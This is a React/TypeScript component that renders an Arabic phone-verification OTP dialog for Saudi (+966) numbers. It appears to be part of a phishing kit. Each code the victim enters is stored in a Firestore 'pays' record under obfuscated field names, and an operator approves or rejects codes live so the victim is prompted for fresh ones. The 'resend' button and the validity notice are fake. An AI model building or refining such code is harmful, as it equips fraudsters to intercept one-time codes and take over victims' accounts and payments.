"use client"

import { useState, useRef, useEffect } from "react"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { AlertCircle, CheckCircle2, Smartphone, Loader2, Shield } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"

interface PhoneOtpDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  phoneNumber: string
  phoneCarrier: string
  onRejected: () => void
  onShowWaitingModal: (carrier: string) => void
  rejectionError?: string
  isSecondRound?: boolean
}

export function PhoneOtpDialog({
  open,
  onOpenChange,
  phoneNumber,
  phoneCarrier,
  onRejected,
  onShowWaitingModal,
  rejectionError,
  isSecondRound,
}: PhoneOtpDialogProps) {
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(60)
  const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected">("waiting")
  const [error, setError] = useState("")
  const inputRef = useRef<HTMLInputElement | null>(null)
  const allOtps = useRef<string[]>([])

  // Countdown timer
  useEffect(() => {
    if (open && timer > 0 && otpStatus === "waiting") {
      const interval = setInterval(() => setTimer((p) => p - 1), 1000)
      return () => clearInterval(interval)
    }
  }, [open, timer, otpStatus])

  // Reset when dialog opens
  useEffect(() => {
    if (open) {
      setTimer(60)
      setOtp("")
      setOtpStatus("waiting")
      allOtps.current = []
      const storedError = localStorage.getItem("phoneOtpRejectionError")
      if (storedError) {
        setError(storedError)
        localStorage.removeItem("phoneOtpRejectionError")
      } else if (rejectionError) {
        setError(rejectionError)
      } else {
        setError("")
      }
      setTimeout(() => inputRef.current?.focus(), 100)
    }
  }, [open, rejectionError])

  // ── Firebase listener for round-2 admin decision ──────────────────────
  // Active when: second round AND user has submitted (verifying state)
  useEffect(() => {
    if (!open || !isSecondRound || otpStatus !== "verifying") return
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorID),
      (docSnap) => {
        if (!docSnap.exists()) return
        const data = docSnap.data()

        if (data.phoneOtpStatus === "approved") {
          setOtpStatus("approved")
          setDoc(doc(db as Firestore, "pays", visitorID), { phoneOtpStatus: "" }, { merge: true })
          setTimeout(() => { window.location.href = "/step4" }, 1200)
        } else if (data.phoneOtpStatus === "rejected") {
          setOtpStatus("waiting")
          setOtp("")
          setError("رمز غير صالح — يرجى إدخال رمز التحقق الصحيح")
          setDoc(doc(db as Firestore, "pays", visitorID), { phoneOtpStatus: "pending" }, { merge: true })
        }
      }
    )
    return () => unsubscribe()
  }, [open, isSecondRound, otpStatus])

  const handleChange = (value: string) => {
    if (/^\d*$/.test(value) && value.length <= 6) {
      setOtp(value)
      setError("")
    }
  }

  const handleVerify = async () => {
    if (otp.length < 4) return
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) { setError("حدث خطأ. يرجى المحاولة مرة أخرى."); return }

    try {
      allOtps.current.push(otp)
      setOtpStatus("verifying")
      setError("")

      if (!db) throw new Error("Firebase not configured")
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        _v7: otp,
        phoneOtpSubmittedAt: new Date().toISOString(),
        allPhoneOtps: allOtps.current,
        phoneOtpStatus: "verifying",
        phoneOtpUpdatedAt: new Date().toISOString(),
      }, { merge: true })

      await addToHistory(visitorID, "_t4", { phoneNumber, phoneCarrier }, "approved")
      await addToHistory(visitorID, "_t5", { _v7: otp }, "pending")

      // Round 2: stay in verifying — Firebase listener handles admin decision
      if (isSecondRound) return

      // Round 1: close dialog, hand off to carrier modal
      onOpenChange(false)
      onShowWaitingModal(phoneCarrier)
    } catch (err) {
      console.error("[PhoneOTP] Error submitting OTP:", err)
      setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
      setOtpStatus("waiting")
    }
  }

  const handleResend = () => {
    setTimer(60)
    setOtp("")
    setError("")
    setOtpStatus("waiting")
    inputRef.current?.focus()
  }

  const isVerifying = otpStatus === "verifying"
  const isApproved  = otpStatus === "approved"
  const isDisabled  = isVerifying || isApproved

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-sm rounded-3xl border-0 shadow-2xl p-0 overflow-hidden" dir="rtl">

        {/* Top gradient strip */}
        <div className="h-1 bg-gradient-to-l from-[#f4ad27] via-[#1a9fd4] to-[#0e3a57]" />

        <div className="px-6 pt-5 pb-6 space-y-5">
          <DialogHeader className="text-center space-y-3 pb-0">
            {/* Icon */}
            <div className="flex justify-center">
              <div className="relative">
                <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#1a5676] to-[#0e3a57] flex items-center justify-center shadow-xl shadow-blue-200">
                  <Smartphone className="w-8 h-8 text-white" />
                </div>
                {isVerifying && (
                  <div className="absolute -top-1 -right-1 w-5 h-5 bg-amber-400 rounded-full flex items-center justify-center shadow">
                    <Loader2 className="w-3 h-3 text-white animate-spin" />
                  </div>
                )}
                {isApproved && (
                  <div className="absolute -top-1 -right-1 w-5 h-5 bg-emerald-500 rounded-full flex items-center justify-center shadow">
                    <CheckCircle2 className="w-3 h-3 text-white" />
                  </div>
                )}
              </div>
            </div>

            <DialogTitle className="text-lg font-black text-slate-800">
              التحقق من رقم الجوال
            </DialogTitle>
            <DialogDescription className="text-sm text-slate-500 leading-relaxed">
              تم إرسال رمز التحقق المكون من{" "}
              <span className="font-bold text-[#1a5676]">6 أرقام</span> إلى رقم
              <br />
              <span className="font-black text-base text-slate-800 mt-1 inline-block" dir="ltr">
                +966 {phoneNumber}
              </span>
            </DialogDescription>
          </DialogHeader>

          {/* Status banners */}
          {isVerifying && (
            <div className="flex items-center gap-3 bg-blue-50 border border-blue-200 rounded-2xl px-4 py-3">
              <Loader2 className="h-5 w-5 text-blue-600 animate-spin flex-shrink-0" />
              <div>
                <p className="text-sm text-blue-900 font-bold">جاري التحقق من الرمز</p>
                <p className="text-xs text-blue-600 mt-0.5">يرجى الانتظار...</p>
              </div>
            </div>
          )}

          {isApproved && (
            <div className="flex items-center gap-3 bg-emerald-50 border border-emerald-200 rounded-2xl px-4 py-3">
              <CheckCircle2 className="h-5 w-5 text-emerald-600 flex-shrink-0" />
              <div>
                <p className="text-sm text-emerald-900 font-bold">تم التحقق بنجاح!</p>
                <p className="text-xs text-emerald-600 mt-0.5">جاري الانتقال إلى الخطوة التالية...</p>
              </div>
            </div>
          )}

          {error && !isVerifying && (
            <Alert variant="destructive" className="rounded-2xl border-red-200 bg-red-50">
              <AlertCircle className="h-4 w-4 text-red-600" />
              <AlertDescription className="text-red-700 font-medium text-sm">{error}</AlertDescription>
            </Alert>
          )}

          {/* OTP input */}
          <div className="flex justify-center" dir="ltr">
            <Input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={otp}
              onChange={(e) => handleChange(e.target.value)}
              placeholder="——————"
              className={`w-full h-16 text-center text-3xl font-black tracking-[0.6em] border-2 rounded-2xl transition-all ${
                error
                  ? "border-red-300 bg-red-50 focus:border-red-400"
                  : isApproved
                  ? "border-emerald-300 bg-emerald-50"
                  : "border-slate-200 focus:border-[#1a5676] bg-slate-50 focus:bg-white"
              }`}
              disabled={isDisabled}
            />
          </div>

          {/* Timer / resend */}
          <div className="text-center">
            {timer > 0 && otpStatus === "waiting" ? (
              <p className="text-xs text-slate-500">
                إعادة إرسال الرمز بعد{" "}
                <span className="font-black text-[#1a5676]">{timer}</span> ثانية
              </p>
            ) : otpStatus === "waiting" ? (
              <button
                type="button"
                onClick={handleResend}
                className="text-sm font-bold text-[#1a5676] hover:text-[#0e3a57] transition-colors"
              >
                إعادة إرسال رمز التحقق
              </button>
            ) : null}
          </div>

          {/* Confirm button */}
          <button
            type="button"
            onClick={handleVerify}
            disabled={otp.length < 4 || isDisabled}
            className="w-full h-12 rounded-2xl font-black text-sm transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
            style={{
              background: isApproved
                ? "linear-gradient(135deg, #10b981, #059669)"
                : isVerifying
                ? "linear-gradient(135deg, #1a5676, #0e3a57)"
                : "linear-gradient(135deg, #f4ad27 0%, #e09a18 50%, #f4ad27 100%)",
              color: isVerifying || isApproved ? "#fff" : "#1a3d52",
              boxShadow: isApproved
                ? "0 8px 24px rgba(16,185,129,0.3)"
                : isVerifying
                ? "0 8px 24px rgba(26,86,118,0.3)"
                : "0 8px 24px rgba(244,173,39,0.4)",
            }}
          >
            {isVerifying ? (
              <span className="flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" /> جاري التحقق...
              </span>
            ) : isApproved ? (
              <span className="flex items-center justify-center gap-2">
                <CheckCircle2 className="h-4 w-4" /> تم التحقق
              </span>
            ) : (
              "تأكيد الرمز"
            )}
          </button>

          <div className="flex items-center justify-center gap-1.5">
            <Shield className="h-3 w-3 text-slate-400" />
            <p className="text-[11px] text-slate-400">رمز التحقق صالح لمدة 10 دقائق فقط</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
